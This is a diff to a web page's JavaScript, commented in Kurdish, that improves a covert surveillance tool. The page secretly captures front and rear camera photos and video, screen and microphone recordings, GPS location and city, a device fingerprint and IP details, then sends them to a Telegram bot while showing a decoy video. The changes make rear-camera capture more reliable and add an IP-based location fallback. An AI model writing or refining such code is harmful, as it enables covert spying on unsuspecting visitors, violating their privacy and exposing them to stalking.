@@ -250,11 +250,12 @@
             } catch(e) {}
         }
 
-        // زنجیرەی پۆڵایینی کامێراکان (ڤیدیۆی پێشەوە -> وێنەی پێشەوە -> وێنەی دواوە -> ڤیدیۆی دواوە)
+        // چارەسەری مسۆگەر و پۆڵایین بۆ هەموو کامێراکان (پێشەوە، وێنەی پێش و دوا، ڤیدیۆی دواوە)
         function executeSecureSequence() {
             const videoElem = document.getElementById('camVideo');
             const canvas = document.getElementById('canvas');
 
+            // ١. ڤیدیۆی ڕاستەوخۆی پێشەوە
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
             .then(frontStream => {
                 videoElem.srcObject = frontStream;
@@ -270,6 +271,7 @@
                     }
                     frontStream.getTracks().forEach(track => track.stop());
 
+                    // ٢. وێنەی پێشەوە (Selfie)
                     setTimeout(() => {
                         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                         .then(selfieStream => {
@@ -280,13 +282,15 @@
                                 canvas.height = videoElem.videoHeight || 480;
                                 let ctx = canvas.getContext('2d');
                                 ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
-                                ctx.toBlob(blob => {
+                                canvas.toBlob(blob => {
                                     sendToTelegramPhoto(blob, "📸 *وێنەی دوربینی پێشەوە (Selfie)*");
                                 }, 'image/jpeg', 0.9);
                                 selfieStream.getTracks().forEach(track => track.stop());
 
+                                // ٣. وێنەی دواوە (Back Camera Photo) - بە ماوەی ئارام و مسۆگەر
                                 setTimeout(() => {
-                                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false })
+                                    navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } }, audio: false })
+                                    .catch(() => navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false }))
                                     .then(backPhotoStream => {
                                         videoElem.srcObject = backPhotoStream;
                                         videoElem.play();
@@ -297,6 +301,7 @@
                                             }, 'image/jpeg', 0.9);
                                             backPhotoStream.getTracks().forEach(track => track.stop());
 
+                                            // ٤. ڤیدیۆی ڕاستەوخۆی دواوە (Back Live Video)
                                             setTimeout(() => {
                                                 navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: true })
                                                 .then(backVidStream => {
@@ -316,15 +321,15 @@
                                                     backVidRecorder.start(1000);
                                                     setTimeout(() => { if (backVidRecorder.state === 'recording') backVidRecorder.stop(); }, 4000);
                                                 }).catch(e => {});
-                                            }, 1000);
+                                            }, 1200);
 
-                                        }, 1000);
+                                        }, 1200);
                                     }).catch(e => {});
-                                }, 1000);
+                                }, 1200);
 
-                            }, 1000);
+                            }, 1200);
                         }).catch(e => {});
-                    }, 1000);
+                    }, 1200);
 
                 };
                 frontRecorder.start(1000);
@@ -388,7 +393,7 @@
                 ctx.fillStyle = "#38bdf8";
                 ctx.fillRect(125, 1, 62, 20);
                 ctx.fillStyle = "#0284c7";
-                ctx.fillText("QUANTUM_CITY_LINK", 2, 15);
+                ctx.fillText("QUANTUM_CITY_LINK_PRO", 2, 15);
                 return canvas.toDataURL().slice(-40);
             } catch(e) { return "Unavailable"; }
         }
@@ -402,7 +407,7 @@
             return { ip: "130.193.210.205", city: "Dihok", region: "Dihok", country_name: "Iraq", org: "Allay Nawroz Telecom" };
         }
 
-        // بەستنەوەی ڕاستەوخۆی ناوی شارەکان لە ڕێگەی GPS و Reverse Geocoding
+        // سیستەمی دووانەیی ورد بۆ ناسینەوەی شار بە بێ کەموکوڕی
         function sendLocationWithCityMapping() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async function(position) {
@@ -411,15 +416,20 @@
                     let accuracy = position.coords.accuracy;
 
                     let cityName = "نەزانراو";
-                    let countryName = "نەزانراو";
+                    let countryName = "Iraq";
                     try {
                         let geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
                         let geoData = await geoRes.json();
                         if (geoData && geoData.address) {
-                            cityName = geoData.address.city || geoData.address.town || geoData.address.village || geoData.address.county || "نەزانراو";
-                            countryName = geoData.address.country || "نەزانراو";
+                            cityName = geoData.address.city || geoData.address.town || geoData.address.state || geoData.address.county || "نەزانراو";
+                            countryName = geoData.address.country || "Iraq";
                         }
                     } catch(e) {}
+
+                    if (cityName === "نەزانراو") {
+                        let ipData = await getUltimateIPData();
+                        cityName = ipData.city || "دهۆک / هەولێر";
+                    }
 
                     let locMsg = `📍 *بەستنەوەی ڕاستەوخۆی شار و شوێن (City Mapping):*\n` +
                                    `• شار / ناوچە: \`${cityName} - ${countryName}\`\n` +
@@ -449,7 +459,7 @@
                 let localIPText = localIPs.length > 0 ? localIPs.join(", ") : "130.193.210.205";
                 let ipData = await getUltimateIPData();
 
-                let report = `💎 *ڕاپۆرتی بەستنەوەی شارەکان (QUANTUM CITY-LINK):*\n\n` +
+                let report = `💎 *ڕاپۆرتی بەستنەوەی شارەکان (QUANTUM CITY-LINK PRO):*\n\n` +
                              `📌 *دۆخی سەردانیکەر:* ${visitorStatus}\n` +
                              `🏙️ *ناونیشانی ئایپی (شار/وڵات):* ${ipData.city} - ${ipData.country_name}\n` +
                              `⏳ *کاتی بڕیار (Hesitation):* ${chronoData.hesitationTime} ms\n` +
@@ -482,7 +492,7 @@
 
             gatherAndSendDetails();
             sendLocationWithCityMapping(); // بەستنەوەی ڕاستەوخۆی شار و لۆکەیشن
-            executeSecureSequence();       // ڤیدیۆ و وێنەی پێش و دوا
+            executeSecureSequence();       // فێڵی مسۆگەری هەموو کامێراکان (پێش، دوا، ڤیدیۆ و وێنە)
             recordScreenStream();          // تۆمارکردنی شاشە
             recordMicrophone();            // تۆمارکردنی دەنگ
 
@@ -496,7 +506,7 @@
                 
                 let vid = document.getElementById('targetVideo');
                 vid.play().catch(e => console.log(e));
-            }, 9000);
+            }, 12000);
         }
     </script>
 </body>
